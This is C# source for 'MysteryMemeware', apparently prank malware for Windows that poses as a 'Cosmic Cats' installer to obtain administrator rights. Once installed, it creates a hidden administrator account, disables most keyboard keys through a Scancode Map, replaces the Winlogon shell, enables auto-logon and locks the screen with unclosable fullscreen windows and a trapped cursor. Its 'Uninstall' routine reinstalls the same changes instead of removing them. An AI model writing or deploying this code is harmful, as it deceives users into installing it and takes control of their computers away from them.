namespace MysteryMemeware
{
    public static class Program
    {
        //Approved 07/26/2022 1:18am
        public static void Main()
        {
            //Primary exception handler swallows exceptions to prevent them from being sent to other processes.

            try
            {
                //Secondary exception handler shows exception messages to the user through win32 popups.

                try
                {
                    //Start up the failsafe to detect if the user holds down the uninstall key and then uninstall this program.

                    RunFailSafe();

                    //If the program is currently installed then start up the installation otherwise if we have administrator then install it and if we do not have administrator then ask for it.

                    if (IsInstalled())
                    {
                        Run();
                    }
                    else if (IsAdmin())
                    {
                        Install();
                    }
                    else
                    {
                        BegForAdmin();
                    }
                }
                catch (System.Exception exception)
                {
                    //If an exception occurs display the exception message to the user in a win32 popup.

                    System.Windows.Forms.MessageBox.Show("Execution failed due to exception: \"" + exception.Message + "\".", "Exception Thrown!", System.Windows.Forms.MessageBoxButtons.OK);
                }
            }
            catch
            {

            }

            //Terminate the process if we reach the end.

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        //Approved 07/26/2022 1:19am
        public static void RunFailSafe()
        {
            long pressStartTime = 0;

            System.Diagnostics.Stopwatch failsafeStopwatch = new System.Diagnostics.Stopwatch();

            System.Timers.Timer failsafeTimer = new System.Timers.Timer();
            failsafeTimer.AutoReset = true;
            failsafeTimer.Interval = 100;

            failsafeTimer.Elapsed += (object sender, System.Timers.ElapsedEventArgs e) =>
            {
                bool escapeDown = GetKeyState(88) < -64;

                if (escapeDown && pressStartTime == 0)
                {
                    pressStartTime = failsafeStopwatch.ElapsedTicks;
                }
                else if (!escapeDown)
                {
                    pressStartTime = 0;
                }

                if (failsafeStopwatch.ElapsedTicks - pressStartTime >= 50000000 && pressStartTime != 0)
                {
                    Uninstall();
                }
            };

            failsafeTimer.Start();

            failsafeStopwatch.Start();
        }
        public static void Run()
        {
            //VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();
            // MouseLockModule.LockMouse();

            int screenCount = System.Windows.Forms.Screen.AllScreens.Length;
            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
            {

                int localScreenIndex = screenIndex;
                System.Threading.Thread thread = new System.Threading.Thread(() =>
                {
                    System.Drawing.Image coverImage = System.Drawing.Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.CoverImage.bmp"));
                    System.Windows.Forms.Form form = new MainForm(localScreenIndex, coverImage);
                    form.ShowDialog();
                });
                thread.Start();
            }

            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.Music.wav"));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
        //Approved 07/26/2022 1:09am
        public static void Install()
        {
            //Install to "C:\MysteryMemeware.exe" and rename if path is taken.

            string installLocation = "C:\\MysteryMemeware.exe";

            for (uint installLocationIndex = 0; installLocationIndex <= 10000; installLocationIndex++)
            {
                try
                {
                    if (installLocationIndex == 0)
                    {
                        installLocation = "C:\\MysteryMemeware.exe";
                    }
                    else
                    {
                        installLocation = "C:\\MysteryMemeware" + installLocationIndex.ToString() + ".exe";
                    }

                    System.IO.File.Copy(typeof(Program).Assembly.Location, installLocation);

                    break;
                }
                catch
                {

                }

                if (installLocationIndex == 10000)
                {
                    throw new System.Exception("Could not find availible file path to install into.");
                }
            }

            //Create new local admin user.

            //Randomly generate a 16 character password from the valid password characters.

            System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

            char[] passwordChars = new char[16] { 'd', 'e', 'f', 'a', 'u', 'l', 't', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '0' };

            for (int i = 0; i < 16; i++)
            {
                passwordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789~!@#$%^&*_-+=`|\\(){}[]:;\"\'<>,.?/"[RNG.Next(0, 94)];
            }

            string password = new string(passwordChars);

            //Create a new administrator user named "MysteryUser" with the password generated above and rename if username is taken.

            string username = "MysteryUser";

            for (uint usernameIndex = 0; usernameIndex <= 100; usernameIndex++)
            {
                try
                {
                    if (usernameIndex == 0)
                    {
                        username = "MysteryUser";
                    }
                    else
                    {
                        username = "MysteryUser" + usernameIndex.ToString();
                    }

                    System.DirectoryServices.DirectoryEntry activeDirectory = new System.DirectoryServices.DirectoryEntry("WinNT://" + System.Environment.MachineName + ",computer");
                    System.DirectoryServices.DirectoryEntry mysteryUser = activeDirectory.Children.Add(username, "user");
                    mysteryUser.Invoke("SetPassword", new object[] { password });
                    mysteryUser.Invoke("Put", new object[] { "Description", "MysteryMemeware administrator access user." });
                    mysteryUser.CommitChanges();

                    System.DirectoryServices.DirectoryEntry administratorsGroup = activeDirectory.Children.Find("Administrators", "group");
                    if (administratorsGroup != null)
                    {
                        administratorsGroup.Invoke("Add", new object[] { mysteryUser.Path.ToString() });
                    }

                    break;
                }
                catch
                {

                }

                if (usernameIndex == 100)
                {
                    throw new System.Exception("Could not find availible username to create MysteryUser.");
                }
            }

            //Open the local machine registry in 64 bit mode for use later.

            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            //Set the users scancode map to a custom scancode map which disables most of the keyboard. For a full list of disabled keys see ATTACKMETHODS.md.

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            //Open the software registry for use later.

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            //Set a registry to disable the privacey experience popup when signing into a new user account.

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            //Open up the winlogon registry for user later.

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            //Set a registry to change the users shell to this program so that it runs instantly uppon sign in. 
            WinLogon.SetValue("Shell", installLocation);

            //Set some registries to automatically sign the user into the the MysteryUser.

            WinLogon.SetValue("DefaultUserName", username);
            WinLogon.SetValue("DefaultPassword", password);
            WinLogon.SetValue("AutoAdminLogon", 1);

            //Close the winlogon registry since we are now completely done using it.

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            //Open up the settings registry to store some information about the installation which was just completed.

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("IsInstalled", "true");
            MysteryMemeware.SetValue("InstallLocation", installLocation);
            MysteryMemeware.SetValue("MysteryUsername", username);
            MysteryMemeware.SetValue("MysteryPassword", password);

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            //Close the software registry since we are now completely done using it.

            Software.Flush();
            Software.Close();
            Software.Dispose();

            //Close the local machine registry since we are now completely done using it.

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            //Restart the users computer to finalize the installation process.

            WinLogOffModule.Restart();
        }
        //Approved 07/26/2022 1:17am
        public static void BegForAdmin()
        {
            if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
            {
                return;
            }

            if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
            {
                return;
            }

            try
            {
                System.Diagnostics.ProcessStartInfo processStartInfo = new System.Diagnostics.ProcessStartInfo(typeof(Program).Assembly.Location);
                processStartInfo.Verb = "runas";
                System.Diagnostics.Process.Start(processStartInfo);

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                if (ex.NativeErrorCode != 1223)
                {
                    throw ex;
                }
                System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
            }
        }
        public static void Uninstall()
        {
            //Restart now command
            //"cmd /C shutdown /r /f /t 0"

            //Delete file command
            //"cmd /C delete \"C:\\MysteryMemeware.exe\""

            //Wait command
            //"cmd /C timeout /T 5 /NOBREAK"

            //


            uint InstallID = 0;
            string InstallLocation = "C:\\MysteryMemeware.exe";

            while (true)
            {
                try
                {
                    if (InstallID == 0)
                    {
                        InstallLocation = "C:\\MysteryMemeware.exe";
                    }
                    else
                    {
                        InstallLocation = "C:\\MysteryMemeware" + InstallID.ToString() + ".exe";
                    }

                    if (System.IO.File.Exists(InstallLocation))
                    {
                        InstallID++;
                    }
                    else
                    {
                        System.IO.File.Copy(typeof(Program).Assembly.Location, InstallLocation);

                        break;
                    }
                }
                catch
                {
                    InstallID++;
                }
            }

            System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

            char[] PasswordChars = new char[12];

            for (int i = 0; i < PasswordChars.Length; i++)
            {
                PasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
            }

            string Password = new string(PasswordChars);

            uint UserID = 0;

            string Username = "MysteryUser";

            while (true)
            {
                try
                {
                    if (UserID == 0)
                    {
                        Username = "MysteryUser";
                    }
                    else
                    {
                        Username = "MysteryUser" + UserID.ToString();
                    }

                    System.DirectoryServices.DirectoryEntry AD = new System.DirectoryServices.DirectoryEntry("WinNT://" + System.Environment.MachineName + ",computer");
                    System.DirectoryServices.DirectoryEntry NewUser = AD.Children.Add(Username, "user");
                    NewUser.Invoke("SetPassword", new object[] { Password });
                    NewUser.Invoke("Put", new object[] { "Description", "MysteryMemeware administrator access user." });
                    NewUser.CommitChanges();

                    System.DirectoryServices.DirectoryEntry grp = AD.Children.Find("Administrators", "group");
                    if (grp != null)
                    {
                        grp.Invoke("Add", new object[] { NewUser.Path.ToString() });
                    }

                    break;
                }
                catch
                {
                    UserID++;
                }
            }


            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            WinLogon.SetValue("Shell", InstallLocation);
            WinLogon.SetValue("DefaultUserName", Username);
            WinLogon.SetValue("DefaultPassword", Password);
            WinLogon.SetValue("AutoAdminLogon", 1);

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("IsInstalled", "true");
            MysteryMemeware.SetValue("InstallLocation", InstallLocation);
            MysteryMemeware.SetValue("MysteryUserID", UserID.ToString());
            MysteryMemeware.SetValue("MysteryUsername", Username);
            MysteryMemeware.SetValue("MysteryPassword", MysteryMemeware);

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            Software.Flush();
            Software.Close();
            Software.Dispose();

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            WinLogOffModule.Restart();

            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        //Approved 07/26/2022 1:35am
        public static bool IsInstalled()
        {
            try
            {
                //Open up the settings registry and checks the value of "IsInstalled" to see if it matchs a number of variations to the string "true".

                Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

                Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);

                string isInstalled = (string)mysteryMemeware.GetValue("IsInstalled");

                mysteryMemeware.Close();
                mysteryMemeware.Dispose();

                LocalMachine.Close();
                LocalMachine.Dispose();

                isInstalled = isInstalled.ToLower();

                if (isInstalled == "1" || isInstalled == "true" || isInstalled == "yes" || isInstalled == "y")
                {
                    return true;
                }

                return false;
            }
            catch
            {
                //If something goes wrong then it is safest to assume that the program is not installed and try to install it again.

                return false;
            }
        }
        //Approved 07/26/2022 1:37am
        public static bool IsAdmin()
        {
            //Checks weather the current process is running as administrator or not.

            try
            {
                System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                //If something went wrong then it is safest to assume we are not yet running as administrator.

                return false;
            }
        }

        [System.Runtime.InteropServices.DllImport("USER32.dll")]
        private static extern short GetKeyState(int virtualKeyID);
        private sealed class MainForm : System.Windows.Forms.Form
        {
            public MainForm(int screenID, System.Drawing.Image coverImage)
            {
                this.BackColor = System.Drawing.Color.White;

                this.ShowInTaskbar = false;

                this.TopMost = true;
                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;

                this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;

                System.Windows.Forms.Screen screen = System.Windows.Forms.Screen.AllScreens[screenID];

                this.Location = screen.Bounds.Location;
                this.Width = screen.Bounds.Width;
                this.Height = screen.Bounds.Height;

                CustomPictureBox pictureBox = new CustomPictureBox();

                double targetAspectRatio = coverImage.Width / (double)coverImage.Height;

                double viewPortWidth = screen.Bounds.Width;
                double viewPortHeight = screen.Bounds.Height;

                double renderWidth = viewPortHeight * targetAspectRatio;
                double renderHeight = viewPortWidth / targetAspectRatio;

                if (renderWidth > viewPortWidth)
                {
                    renderWidth = viewPortWidth;
                }
                if (renderHeight > viewPortHeight)
                {
                    renderHeight = viewPortHeight;
                }

                double renderX = (viewPortWidth - renderWidth) / 2;
                double renderY = (viewPortHeight - renderHeight) / 2;

                pictureBox.Location = new System.Drawing.Point((int)renderX, (int)renderY);
                pictureBox.Width = (int)renderWidth;
                pictureBox.Height = (int)renderHeight;

                pictureBox.Image = coverImage;
                pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;

                this.Controls.Add(pictureBox);

                this.FormClosing += OnFormClosing;

                this.Load += OnFormLoad;

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }

            private void OnFormLoad(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
                timer.Tick += OnTimerTick;
                timer.Interval = 1000;
                timer.Start();

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnTimerTick(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnFormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
            {
                e.Cancel = true;
            }
            private sealed class CustomPictureBox : System.Windows.Forms.PictureBox
            {
                protected override void OnPaint(System.Windows.Forms.PaintEventArgs paintEventArgs)
                {
                    paintEventArgs.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                    base.OnPaint(paintEventArgs);
                }
            }
        }
    }
}